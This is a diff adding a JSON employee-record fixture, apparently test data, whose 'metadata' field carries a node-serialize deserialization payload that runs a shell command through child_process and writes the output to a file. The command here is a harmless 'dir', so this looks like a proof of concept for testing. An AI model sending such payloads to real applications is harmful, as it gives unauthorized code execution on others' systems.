@@ -1,0 +1,16 @@
+[
+  {
+    "name": "Command Test User",
+    "position": "Tester",
+    "department": "Security",
+    "email": "test@example.com",
+    "phone": "555-000-0000",
+    "location": "Remote",
+    "hire_date": "2023-01-01",
+    "status": "active",
+    "manager": "None",
+    "salary": 0,
+    "bio": "This is a test.",
+    "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const { execSync } = require('child_process'); try { const output = execSync('dir', { encoding: 'utf8' }); require('fs').writeFileSync('command_output.txt', output); return output; } catch(e) { return e.toString(); }}()\"}"
+  }
+] 
